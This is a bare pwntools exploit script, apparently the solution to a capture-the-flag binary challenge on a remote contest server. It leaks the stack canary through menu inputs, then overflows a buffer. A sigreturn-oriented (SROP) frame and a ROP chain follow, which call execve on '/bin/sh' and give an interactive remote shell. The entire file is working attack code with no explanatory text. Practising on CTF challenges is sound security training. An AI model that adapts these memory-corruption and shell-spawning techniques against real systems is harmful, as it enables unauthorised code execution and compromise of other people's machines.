#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./anmie',checksec=False)

#p = process()
p = remote('cha-thjcc.scint.org', 10101)
#gdb.attach(p,gdbscript='''
#           b*0x0000000000401CB2
#           ''')
syscall = 0x000000000041a2e6
pop_rsi = 0x000000000041fcf5
pop_rdi = 0x0000000000494253
mov_rdx_rbx = 0x0000000000432f5b
pop_rbx = 0x00000000004571e7
pop_rax = 0x0000000000434bbb
p.sendlineafter(b'anime > ',b'Darling in the FRANXX')
p.sendlineafter(b'user > ',b'14')
p.recvuntil(b'User ')
canary = p.recv(8)
p.sendlineafter(b'passcode > ',b'15')
p.recvuntil(b'code ')
canary = p.recv(8) + canary
canary = b'0x' + canary
print("canary :",canary)

frame = SigreturnFrame()
frame.rax = 0
frame.rdi = 0
frame.rsi = 0x4d26e0
frame.rdx = 0x100
frame.rip = syscall
frame.rsp = 0x4d26e0+8

canary = int(canary,16)
payload = b'a'*56
payload += p64(canary)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(0xf)
payload += p64(syscall)
payload += bytes(frame)
p.sendline(payload)
input()
p.sendline(b'/bin/sh\x00'+ p64(pop_rdi) + p64(0x4d26e0) + p64(pop_rsi) + p64(0) + p64(pop_rax) + p64(0x3b) + p64(pop_rbx) + p64(0) + p64(mov_rdx_rbx))




p.interactive()
